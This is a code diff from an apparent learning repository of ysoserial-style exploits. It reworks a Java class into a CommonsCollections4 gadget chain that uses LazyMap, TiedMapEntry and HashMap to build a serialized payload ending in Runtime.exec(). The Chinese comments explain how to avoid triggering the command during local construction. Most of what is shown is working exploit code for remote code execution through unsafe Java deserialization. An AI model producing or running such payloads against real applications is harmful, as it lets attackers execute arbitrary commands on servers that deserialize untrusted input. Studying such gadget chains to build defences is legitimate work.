@@ -3,13 +3,15 @@ package com.xjjlearning.hack.java.ysoserial.payloads;
 import com.xjjlearning.hack.java.ysoserial.payloads.util.ReflectionUtil;
 import com.xjjlearning.hack.java.ysoserial.payloads.util.SerializationUtil;
 import org.apache.commons.collections4.Transformer;
-import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.ChainedTransformer;
 import org.apache.commons.collections4.functors.ConstantTransformer;
 import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.keyvalue.TiedMapEntry;
+import org.apache.commons.collections4.map.LazyMap;
 
+import java.util.HashMap;
+import java.util.Map;
 import java.util.Optional;
-import java.util.PriorityQueue;
 
 /**
  * created by xjj on 2023/2/8
@@ -29,7 +31,7 @@ import java.util.PriorityQueue;
                             java.lang.reflect.Method.invoke()
                                 java.lang.Runtime.exec()
  */
-public class CommonCollections2 {
+public class CommonCollections4 {
     // jdk8u71以及之后的版本使用
     public byte[] getPayload(String exp) throws Exception {
         // 假的transformerChain, 后来用反射替换成真的, 原因在于防止本地调试触发计算器
@@ -50,13 +52,21 @@ public class CommonCollections2 {
                 new ConstantTransformer(1) // 隐藏告警日志
         };
 
-        TransformingComparator comparator = new TransformingComparator(transformerChain);
-        PriorityQueue priorityQueue = new PriorityQueue(2, comparator);
-        priorityQueue.offer(1);
-        priorityQueue.offer(2); //两个元素执行调整堆大小的操作
+        // HashMap.readObject() -> HashMap.hash(key) -> TiedMapEntry.hashCode() -> LazyMap.get()
+        Map outerMap = LazyMap.lazyMap(new HashMap(), transformerChain);
+
+        HashMap obj = new HashMap();
+        // 这个put也执行了一遍TiedMapEntry.hashCode()方法, 导致先执行了一遍LazyMap.get(), (如果不用假的chain先放入其中的话会在本地弹出计算器, 但是并没有构造好利用链)
+        // 这个将我们的key以及经过factory.transform(key)的value放入LazyMap, 所以需要我们再手动删掉这个key
+        obj.put(new TiedMapEntry(outerMap, "key"), "");
+        // 如果不删除这个key 在反序列化的时候就无法执行transform方法啦
+        outerMap.remove("key");
+
+        // 变量替换 防止上边obj.put()方法弹出计算器
+        // 使用 ChainedTransformer 就需要修改这个变量
         ReflectionUtil.setFieldValue(transformerChain, "iTransformers", transformers);
 
-        Optional<byte[]> b = SerializationUtil.serialize(priorityQueue);
+        Optional<byte[]> b = SerializationUtil.serialize(obj);
         return b.get();
     }
 
@@ -67,6 +77,6 @@ public class CommonCollections2 {
     }
 
     public static void main(String[] args) throws Exception {
-        new CommonCollections2().gadget();
+        new CommonCollections4().gadget();
     }
 }
